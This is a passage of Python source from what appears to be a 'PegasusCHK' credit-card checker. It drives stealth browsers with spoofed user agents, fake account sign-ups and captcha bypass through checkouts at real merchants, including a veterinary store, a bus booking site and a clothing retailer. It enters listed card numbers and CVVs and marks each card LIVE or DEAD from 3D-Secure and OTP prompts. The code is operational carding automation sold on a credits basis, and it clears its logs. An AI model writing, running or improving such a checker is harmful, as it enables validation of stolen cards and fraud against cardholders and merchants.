                        livemsg = f"LIVE|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"
                        year = f"{ano[2:4]}"

                        sb.wait_for_element("#redsys-hosted-field-number")
                        sb.switch_to_frame("#redsys-hosted-field-number")
                        sb.type("#credit-card-number", self.ccs[self.cont])
                        sb.switch_to_default_content()

                        sb.wait_for_element("#redsys-hosted-field-expirationMonth")
                        sb.switch_to_frame("#redsys-hosted-field-expirationMonth")
                        sb.type("#expirationMonth", self.mes[self.cont])
                        sb.switch_to_default_content()

                        sb.wait_for_element("#redsys-hosted-field-expirationYear")
                        sb.switch_to_frame("#redsys-hosted-field-expirationYear")
                        sb.type("#expirationYear", year)
                        sb.switch_to_default_content()

                        sb.wait_for_element("#redsys-hosted-field-cvv")
                        sb.switch_to_frame("#redsys-hosted-field-cvv")
                        sb.type("#cvv", self.cvv[self.cont])
                        sb.switch_to_default_content()

                        sb.wait_for_element("#redsys-hosted-pay-button")
                        sb.switch_to_frame("#redsys-hosted-pay-button")
                        sb.click("#divImgAceptar")
                        sb.switch_to_default_content()

                        # Analizando pago

                        try:
                            msgPay = sb.get_text("//div[contains(@class, 'swal-title') and contains(text(), 'Hay un error en el pago')]")
                            self.text_dead.emit(deadmsg)
                        except Exception as e:
                            msgPay = ""
                            time.sleep(500)
                            time.sleep(500)
                            time.sleep(500)
                            time.sleep(500)

                        print(msgPay)
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        sb.refresh()


                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')



def Paulispro(self):

    self.cont = 0 
    createAccount = 0
    self.text_changed.emit("Iniciando OTP 3D Valid | INFINITY")

    if "BANCO DE BOGOTA" in self.tools.bintype(self.ccs[self.cont]):
        bookaway(self)
        return None

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)
        
        with SB(incognito=True , headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            # Determina la plataforma basada en el User-Agent

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                    return None

                self.email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                self.passwd = 'C2*#'+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789*#') for _ in range(8))
                self.phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                self.address = str(random.randint(100, 999)) + ' winding lake rd'


                links = [

                    'https://shoalcreekanimalhospital.securevetsource.com/itemView.pml?productId=142622&auto=true',
                    'https://shoalcreekanimalhospital.securevetsource.com/itemView.pml?productId=143108&auto=true',
                    'https://shoalcreekanimalhospital.securevetsource.com/itemView.pml?productId=143474&auto=true',
                    'https://shoalcreekanimalhospital.securevetsource.com/itemView.pml?productId=143328&auto=true'

                ]

                random_account = setCuenta("", "", "GET")
                link = random.choice(links)

                try:

                    print('USER AGENT ACTUAL:', sb.get_user_agent())
                    sb.open(link)

                    sb.click('button#actionButtonAddToCart')
                    time.sleep(random.uniform(1, 3))

                    if createAccount == 1:

                        self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

                        sb.open('shoalcreekanimalhospital.securevetsource.com/signup.pml?destination=/checkoutReview.pml')
                        sb.type('input#signUpPhoneNumber', self.phone_number)
                        sb.click('button#collectPhoneStep')
                    
                        # FORM REGISTER

                        sb.type('input#signUpFirstName', self.first1)
                        sb.type('input#signUpLastName', self.last1)
                        sb.type('input#signUpEmail', self.email)
                        sb.type('input#signUpPassword', self.passwd)
                        sb.click('button#moreAboutYouStep')

                        sb.open('shoalcreekanimalhospital.securevetsource.com/visitorLogin.pml?destination=/checkoutReview.pml')

                        msgEMite = 'Cuenta registrada con exito.' + self.email + self.passwd
                        self.printed.emit(msgEMite)
                        setCuenta(self.email, self.passwd, "VBV")

                        # Shipping Address FORM

                        sb.wait_for_element('button#noAddressNextButton')
                        sb.type('input#noAddress_firstName', self.first1)
                        sb.type('input#noAddress_lastName', self.last1)
                        sb.type('input#noAddress_address1',  self.address)
                        sb.type('input#noAddress_city', 'Sunrise')
                        sb.select_option_by_text('select#noAddress_region', 'FL')
                        sb.type('input#noAddress_postalCode', '33351')
                        sb.type("#noAddress_phone1", self.phone_number)
                        sb.click('button#noAddressNextButton')

                        try:
                            sb.click('button#shippingOptionsSaveButton')
                        except:
                            sb.click('button#Dialog_changing-clinics_button_keep_ShippingAddresses')
                            sb.click('button#shippingOptionsSaveButton')

                    else:

                        # FORM LOGIN

                        sb.open('shoalcreekanimalhospital.securevetsource.com/visitorLogin.pml?destination=/checkoutReview.pml')

                        try:
                            sb.type('input#login_username', random_account['email'])
                        except Exception as e:
                            sb.click('#loginWithEmailLink')
                            sb.type('input#login_username', random_account['email'])                            
                        time.sleep(random.uniform(1, 3))
                        sb.type('input#login_password', random_account['password'])
                        sb.click('button#logInButton')

                        # Debug analisis cuentas
                        #time.sleep(random.uniform(1, 3))

                        try:
                            sb.click('button#addressNextButton')                            
                        except:
                            msgAccount = sb.get_text("//div[@class='kibble-alert-content']/p", timeout=3)
                            setCuenta(random_account['email'], random_account['password'], "DELETE")

                        sb.click('#shippingOptionsSaveButton')
                        time.sleep(random.uniform(1, 3))
                        #sb.click('button#shippingOptionsSaveButton')
                        #time.sleep(random.uniform(1, 3))

                        cuentaLog = random_account['email'] + ':' + random_account['password']
                        self.printed.emit(cuentaLog)
                        

                    self.text_changed.emit('El vuelo de Pegasus ha comenzado... 🐎 Reuniendo sabiduría. ⏳')

                    contador = 0

                    while self.cont < self.total_lines and contador < 4:

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        deadmsg = f"DEAD|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"
                    
                        # frame payment
                        # <iframe id="iframe_container_content" width="100%" height="180px" style="" frameborder="0" src="https://secure.payconex.net/iframe/styled.php?aid=120614963364&amp;lang=en&amp;cvv=required&amp;expy=double_input&amp;timeout=10&amp;css=eyJjbGFzc19yb3ciOiIiLCJjbGFzc19sYWJlbCI6ImRpc3BsYXk6YmxvY2s7Y29sb3I6ICMwMDFBMTQ7Zm9udC1mYW1pbHk6ICdCYXJsb3cnLCBzYW5zLXNlcmlmO2ZvbnQtc2l6ZTogMTRweDtmb250LXN0eWxlOiBub3JtYWw7Zm9udC13ZWlnaHQ6IDUwMDtsaW5lLWhlaWdodDogMjRweDsgbWFyZ2luLWJvdHRvbTogNHB4IiwiY2xhc3NfaW5wdXRfYm94IjoiaGVpZ2h0OjQwcHg7Ym9yZGVyOjFweCBzb2xpZCAjQjdCQ0JDO2JvcmRlci1yYWRpdXM6IDZweDtmb250LWZhbWlseTogJ0JhcmxvdycsIHNhbnMtc2VyaWY7Zm9udC1zaXplOiAxNnB4O2ZvbnQtc3R5bGU6IG5vcm1hbDtmb250LXdlaWdodDogNDAwO2xpbmUtaGVpZ2h0OiAyNHB4O2NvbG9yOiAjMDAxQTE0O3BhZGRpbmc6OHB4O2JveC1zaXppbmc6Ym9yZGVyLWJveCIsImlkX2Zvcm0iOiIiLCJpZF9leHB5X2lucHV0X21vbnRoIjoid2lkdGg6IDcwcHg7IG1hcmdpbi1yaWdodDogOHB4IiwiaWRfZXhweV9pbnB1dF95ZWFyIjoid2lkdGg6IDcwcHg7IiwiaWRfbnVtYmVyX3JvdyI6IndpZHRoOiAxMDAlOyBtYXgtd2lkdGg6IDQwMHB4OyBtYXJnaW4tYm90dG9tOiAyNHB4IiwiaWRfbnVtYmVyX2lucHV0IjoibWluLXdpZHRoOiAzMjBweDtiYWNrZ3JvdW5kOiNGRkZGRkYgbm8tcmVwZWF0IGxlZnQgY2VudGVyO3BhZGRpbmctbGVmdDo0MHB4OykiLCJpZF9leHB5X3JvdyI6Im1hcmdpbi1yaWdodDogMTJweDtkaXNwbGF5OiBpbmxpbmUtYmxvY2siLCJpZF9jdnZfcm93IjoiZGlzcGxheTogaW5saW5lLWJsb2NrO3dpZHRoOjEwMCU7IG1heC13aWR0aDogMTU1cHgiLCJpZF9jdnZfaW5wdXQiOiJ3aWR0aDogMTAwJTsgbWF4LXdpZHRoOiAxNzVweCIsImlkX3RpbWVvdXRfbGluayI6IiJ9&amp;text=eyJudW1iZXIiOnsibGFiZWwiOiJDYXJkIG51bWJlciIsInBsYWNlaG9sZGVyIjoiMDAwMCAwMDAwIDAwMDAgMDAwMCJ9LCJjdnYiOnsibGFiZWwiOiJTZWN1cml0eSBjb2RlIiwicGxhY2Vob2xkZXIiOiIwMDAifSwiZXhweV9zaW5nbGUiOnsibGFiZWwiOiJFeHBpcnkgZGF0ZSIsInBsYWNlaG9sZGVyIjoiTU1ZWSJ9LCJleHB5X2RvdWJsZSI6eyJsYWJlbCI6IkV4cGlyeSBkYXRlIn0sImV4cHlfc2luZ2xlX2Ryb3Bkb3duIjp7ImxhYmVsIjoiRXhwaXJ5IGRhdGUiLCJwbGFjZWhvbGRlciI6Ik1NWVkifSwidGltZW91dF9oZWFkZXIiOnsidGV4dCI6IlNlc3Npb24gdGltZWQgb3V0In0sInRpbWVvdXRfYm9keSI6eyJ0ZXh0IjoiWW91ciBzZXNzaW9uIHRpbWVkIG91dC4gUGxlYXNlIHRyeSBhZ2Fpbi4ifX0%3D"></iframe>
                        try:
                            sb.wait_for_element('#iframe_container_content')
                        except Exception as e:
                            if "ElementNotVisibleException" in e:
                                msgConsole = "Cuenta dañada", self.email
                                self.printed.emit(msgConsole)
                            
                        sb.switch_to_frame('#iframe_container_content')
                        sb.type('input#id_number_input', self.ccs[self.cont])
                        sb.type('input#id_expy_input_month', self.mes[self.cont])
                        sb.type('input#id_expy_input_year', self.anio[self.cont][2:4])
                        sb.type('input#id_cvv_input', self.cvv[self.cont])
                        time.sleep(random.uniform(1, 3))

                        sb.switch_to_default_content()
                        time.sleep(1)
                        sb.click("//div[@id='placeOrder_default']//button[@id='place-order']")
                        
                        # Analizando resultados

                        time.sleep(random.uniform(2, 5))

                        try:

                            sb.wait_for_element('#alertPopupMessage')
                            msgPay = sb.get_text('#alertPopupMessage')
                            createAccount = 2
                            
                        except Exception as e: # 3D no encontrado

                            print('Error analizando pago:', e)

                            sb.wait_for_element('#iframe_container_content')
                            sb.switch_to_frame('#iframe_container_content')
                            sb.wait_for_element('#challengeiframe')
                            sb.switch_to_frame('#challengeiframe')
                            msgPay = sb.get_text('body')
                            createAccount = 2
                        
                            
                        print(msgPay)

                        ulti = self.ccs[self.cont][-4:]
                        palabras_clave = ["termina en", "hemos enviado", "el monto de", "mensaje de texto", "xxx-xxx-", "authorized cardholder", "passcode", "Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                        encontrada = any(palabra in msgPay for palabra in palabras_clave)
                        
                        if encontrada:
                            if self.tools.repetir(livemsg) == True:
                                self.text_dead.emit(deadmsg)
                            else:
                                self.text_live.emit(livemsg)
                        else:
                            self.text_dead.emit(deadmsg)

                        sb.switch_to_default_content()
                        
                        sb.refresh()
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        time.sleep(random.uniform(4, 7))
                        sb.click('button#addressNextButton')
                        sb.click('button#shippingOptionsSaveButton')

                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                        break
                
                except Exception as e:

                    print('Error en configuracion de navegador.', e)
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            

        if os.path.exists('latest_logs'):
            shutil.rmtree('latest_logs')      
    self.text_changed.emit('TESTEO FINALIZADO')

def PaulisBog(self):

    def createLink(self):
        try:

            self.text_changed.emit('El vuelo de Pegasus debe cargarse... 🐎 Esto tomara mas tiempo de lo habitual. ⏳')
            #fecha_hoy = datetime.now().strftime('%Y-%m-%d')
            #url_original = "https://www.bookaway.com/es/s/mexico/tulum-to-cancun?departuredate=2024-12-14&adult=1"
            #nueva_url = url_original.replace("departuredate=2024-12-02", f"departuredate={fecha_hoy}")
            #sb.open(nueva_url)
            
            sb.open("https://www.bookaway.com/es/routes/mexico/tulum-to-cancun/rt-wqqtsh6os59c?departuredate=2024-12-03&fromstation=651e77a2dd1917a1364f2951&tostation=651e77a2dd1917a1364f266a&adult=1&departuretime=1255AM")
            time.sleep(random.uniform(3, 7))
            #sb.click("(//a[@data-cy='search-card-header-clickable'])[2]", timeout=10)
            sb.click('//button[@data-cy="product-page-cta"]')
            sb.type("//input[@type='text' and @required]", self.first1)
            sb.type("(//input[@type='text' and @required])[2]", self.last1)
            sb.type("//input[@type='email' and @required]", email)
            sb.type("//input[@type='tel' and @required]", phone_number)
            #sb.type("//input[@id='react-select-3-input']", 'Pegasus123*')

            paisElement = sb.find_element("xpath", '//input[@id="react-select-2-input"]')
            sb.type("input#react-select-2-input", "Colombia")
            paisElement.send_keys(Keys.ENTER)

            sb.click('//*[@id="__next"]/div/div/div/div[2]/form/div[1]/section/div[4]/div[1]/div[2]/label/div/div/div/div/div/div')
            time.sleep(1)
            sb.click('#react-tiny-popover-container > div > div > a:nth-child(1) > div')

            sb.click("//button[@data-cy='checkout-cta']")

            time.sleep(random.uniform(5, 10))

            sb.click("//label[contains(text(), 'Agregar seguro')]", timeout=15)

            sb.click("//button[@data-cy='checkout-cta']", timeout=20)

            sb.wait_for_element("//button[@data-cy='book-ride-button']", timeout=20)

            url = sb.get_current_url()
            crawlerLink('LINK', url)
        
        except:
            self.text_changed.emit('ELIMINANDO RASTREADORES!') 
            exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" #+ link
            self.printed.emit(error_message)

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(uc=True, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            # Determina la plataforma basada en el User-Agent

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                passwd = 'C2*#'+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789*#') for _ in range(8))
                phone_number = f"5731{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake rd'
                fName = self.first1 + " " + self.last1

                link = crawlerLink("GET", "")

                try:

                    print('USER AGENT ACTUAL:', sb.get_user_agent())
                    if self.username == "ZenoxPav":
                        createLink(self)
                    sb.open(link)

                    self.text_changed.emit('El vuelo de Pegasus ha comenzado... 🐎 Reuniendo sabiduría. ⏳')

                    contador = 0
                    msgPay = None

                    while self.cont < self.total_lines and contador < 4:

                        time.sleep(random.uniform(2, 3))
                        
                        #sb.wait_for_element("//iframe[contains(@title, 'entrada seguro del número de tarjeta')]")
                        sb.wait_for_element("//iframe[contains(@title, 'entrada seguro del número de tarjeta') or contains(@title, 'Secure card number input frame')]")

                        sb.type("//input[@data-cy='name-on-card-input']", fName)

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"
                        
                        sb.switch_to_frame("//iframe[contains(@title, 'entrada seguro del número de tarjeta') or contains(@title, 'Secure card number input frame')]")
                        sb.type('#root > form > span:nth-child(4) > div > div > div.CardNumberField-input-wrapper > span > input', self.ccs[self.cont])
                        sb.switch_to_default_content()

                        #sb.wait_for_element("//iframe[contains(@title, 'entrada seguro de la fecha')]")
                        sb.wait_for_element("//iframe[contains(@title, 'entrada seguro de la fecha') or contains(@title, 'Secure expiration date input frame')]")
                        sb.switch_to_frame("//iframe[contains(@title, 'entrada seguro de la fecha') or contains(@title, 'Secure expiration date input frame')]")
                        sb.type('#root > form > span:nth-child(4) > div > span > input', fecha)
                        sb.switch_to_default_content()

                        sb.wait_for_element("//iframe[contains(@title, 'CVC')]")
                        sb.switch_to_frame("//iframe[contains(@title, 'CVC')]")
                        sb.type('#root > form > span:nth-child(4) > div > span > input', self.cvv[self.cont])
                        time.sleep(random.uniform(1, 3))

                        sb.switch_to_default_content()

                        time.sleep(random.uniform(1, 3))

                        try:
                            sb.click("//div[@role='checkbox']", timeout=5)
                        except:
                            pass


                        try:
                            btn = sb.wait_for_element_clickable("//button[@title='Reservar este viaje' and @data-cy='book-ride-button']", timeout=5)
                            sb.execute_script("arguments[0].click();", btn)
                            sb.click("//button[@title='Reservar este viaje' and @data-cy='book-ride-button']", timeout=20)
                            
                        except:
                            sb.click("#__next > div > div > div > div.jsx-1293382797.details-page.summary-first > form > div.jsx-3515225461.header-layout_fixed.header-padding.summary-first > div > div.jsx-42174565.action > div.jsx-439956053.action > button")
                            

                        # Analizando resultados

                        time.sleep(random.uniform(1, 3))

                        try:
                            msgPay = sb.get_text('//span[@class="text" and contains(text(), "sesión ha caducado")]', timeout=5)
                            if 'ha caducado' in msgPay:
                                # Eliminando Link
                                crawlerLink('DELETE', link)
                                createLink(self)
                        except:
                            try:
                                msgPay = sb.get_text('//span[@data-cy="undefined-error-message"]', timeout=5)
                                if contador == 0 and msgPay != None:
                                    createLink(self)
                            except:
                                sb.wait_for_element("body > div:nth-child(1) > iframe", timeout=15)
                                sb.switch_to_frame("body > div:nth-child(1) > iframe")
                                sb.wait_for_element("#challengeFrame", timeout=15)
                                sb.switch_to_frame("#challengeFrame")
                                msgPay = sb.get_text("body")
                            
                        print(msgPay)

                        ulti = self.ccs[self.cont][-4:]
                        palabras_clave = ["termina en", "hemos enviado", "el monto de", "mensaje de texto", "xxx-xxx-", "authorized cardholder", "passcode", "Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                        encontrada = any(palabra in msgPay for palabra in palabras_clave)
                        
                        if encontrada:
                            if self.tools.repetir(livemsg) == True:
                                self.text_dead.emit(deadmsg)
                            else:
                                if self.recheck == True:
                                    payitRecheck(self)
                                    #allhands(self)
                                else:
                                    self.text_live.emit(livemsg)
                        else:
                            self.text_dead.emit(deadmsg)

                        sb.switch_to_default_content()
                        
                        sb.refresh()
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        time.sleep(random.uniform(2, 4))

                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                        break
                
                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" #+ link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def recaptcha(self):
    with SB(test=False, uc=True) as sb:
        url = "https://gitlab.com/users/sign_in"
        sb.uc_open_with_reconnect(url, 4)
        sb.uc_gui_click_captcha()
        sb.assert_text("Username", '[for="user_login"]', timeout=3)
        sb.assert_element('label[for="user_login"]')
        sb.highlight('button:contains("Sign in")')
        sb.highlight('h1:contains("GitLab.com")')
        sb.post_message("SeleniumBase wasn't detected", duration=4)

def koaj(self):

    self.text_changed.emit("Auth Valid Payu | BlackHole 🧿⃤")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.koaj.co/inicio-sesion?register'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)
                    time.sleep(random.uniform(2, 3))
                    btn = sb.wait_for_element_clickable("#uniform-id_gender1", timeout=5)
                    sb.execute_script("arguments[0].click();", btn)
                    #sb.click("#id_gender1")
                    sb.type("#customer_firstname", self.first1)
                    sb.type("#customer_lastname", self.last1)
                    sb.type("#email-register", email)
                    sb.type("#passwd", "Pegasus123*")
                    sb.type("#repeat_passwd", "Pegasus123*")
                    sb.select_option_by_value("#document_type", "1")
                    sb.type("#dni", dni)
                    sb.select_option_by_value("#days", "13")
                    sb.select_option_by_value("#months", "2")
                    sb.select_option_by_value("#years", "2000")

                    sb.click("#continue_first_part")
                    time.sleep(random.uniform(2, 3))

                    sb.type("#phone_mobile", phone_number)
                    sb.select_option_by_value("#id_state", "366")
                    time.sleep(random.uniform(2, 3))
                    sb.select_option_by_value("#id_city", "17")
                    sb.type("#address1", address)

                    sb.click("#uniform-fake_lopd")
                    sb.click("#acceptLopd")
                    sb.click("#submitAccount")
                    time.sleep(random.uniform(2, 3))

                    sb.open('https://www.koaj.co/tarjeta-de-regalo/34512-tarjeta-regalo-200000.html')
                    time.sleep(random.uniform(2, 3))
                    sb.click("#add_to_cart > button")
                    time.sleep(random.uniform(2, 3))
                    sb.open("https://www.koaj.co/pedido-rapido")
                    time.sleep(random.uniform(4, 6))

                    # PETICION ORDEN

                    self.text_changed.emit('Inyeccion BlackHole... 🧿⃤" Esto puede tardar unos instantes. ⏳')

                    print("EMAIL:", email)

                    def format_number(value):
                        # Convertimos el número a una cadena, si no lo es ya
                        value_str = str(value)
                        
                        # Verificamos que la longitud sea adecuada para el formato deseado
                        if len(value_str) != 16:
                            raise ValueError("El número debe tener 16 dígitos")
                        
                        # Formateamos la cadena usando slicing e insertando guiones
                        formatted_value = f"{value_str[:4]}-{value_str[4:8]}-{value_str[8:12]}-{value_str[12:]}"
                        return formatted_value

                    # Organizando data de CC
                    ccs, mes, ano, ccn, typ = (
                    str(self.ccs[self.cont]).strip(),
                    str(self.mes[self.cont]).strip(),
                    str(self.anio[self.cont]).strip(),
                    str(self.cvv[self.cont]).strip(),
                    self.tools.bintype(self.ccs[self.cont])
                    )

                    brand = self.ccs[self.cont][0:1]
                    binCC = self.ccs[self.cont][0:6]

                    #self.text_changed.emit('🔍 Iniciando validación extra para asegurar resultados. ¡Tu seguridad es nuestra prioridad! 🛡️✨')

                    deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                    livemsg = f"LIVE|PEGASUSCHK|LEGACYCHARGED|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                    fecha = f"{mes}{ano[2:4]}"

                    mes = str(int(self.mes[self.cont]))

                    formatlive = format_number(self.ccs[self.cont])


                    url = "https://www.koaj.co/module/_sd_payu/validation"

                    headers = {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "accept-language": "es-ES,es;q=0.9",
                        "cache-control": "max-age=0",
                        "content-type": "application/x-www-form-urlencoded",
                        "priority": "u=0, i",
                        "sec-ch-ua": "\"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
